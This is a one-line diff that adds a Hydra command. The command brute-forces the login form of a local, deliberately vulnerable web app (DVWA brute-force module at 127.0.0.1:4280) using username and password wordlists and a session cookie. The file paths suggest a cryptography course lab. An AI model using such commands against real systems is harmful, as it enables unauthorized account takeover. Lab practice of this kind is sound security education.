@@ -1,0 +1,1 @@
+hydra -L /Users/diego/Desktop/Criptografia/Lab02/top-usernames-shortlist.txt -P /Users/diego/Desktop/Criptografia/Lab02/Pwdb_top-1000.txt -o hydra_results.txt -b text 'http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=quhvno6km4g0h3bkngkref2op5;security=low:F=Username and/or password incorrect'
